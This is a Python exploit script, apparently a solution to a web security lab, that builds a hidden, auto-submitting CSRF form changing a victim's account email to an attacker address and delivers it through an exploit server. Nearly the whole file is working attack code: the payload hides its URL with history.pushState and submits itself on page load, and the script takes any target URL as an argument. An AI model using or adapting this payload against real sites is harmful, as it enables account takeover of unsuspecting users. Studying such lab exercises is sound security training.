import requests
import urllib3
from sys import argv
import os


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_website_urls():
        if len(argv) != 3:
                print(f"[+] usage {argv[0]} <url> <exploit_server_url>")
                print(f"[+] example {argv[0]} 'http://example.com' 'http://exploit.server.com'")
                exit(-1)
        if argv[1][-1] == '/' or argv[2][-1] == '/':
                url = argv[1][:-1]
                exlpoit_server = argv[2][:-1]
        else:
                url = argv[1]
                exlpoit_server = argv[2]
        return url,exlpoit_server

def send_to_exploit_server():
    email = 'attacker@attack.com'
    change_email_path = '/my-account/change-email'
    url,exlpoit_server = get_website_urls()
    action = url + change_email_path
    html_code = f'<html>\
                      <body>\
                      <script>history.pushState(\'\', \'\', \'/\')</script>\
                        <form action="{action}" method="POST">\
                          <input type="hidden" name="email" value="{email}" />\
                          <input type="submit" value="Submit request" style="display: none;" />\
                        </form>\
                        <script>\
                          document.forms[0].submit();\
                        </script>\
                      </body>\
                  </html>'
    params = {
        "urlIsHttps":"on",
        "responseFile":"/exploit",
        "responseHead":"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody":html_code,
        "formAction":"DELIVER_TO_VICTIM"
    }
    r = requests.post(exlpoit_server, data=params)
    if 'Congratulations' in r.text:
        print("[+] attack successfully")
    else:
        print("[-] attack unsuccessfully")
        print("[-] please use valid csrf token")


print("[!] don't forget login to lab before runing this script")
print("[+] Starting attack")
send_to_exploit_server()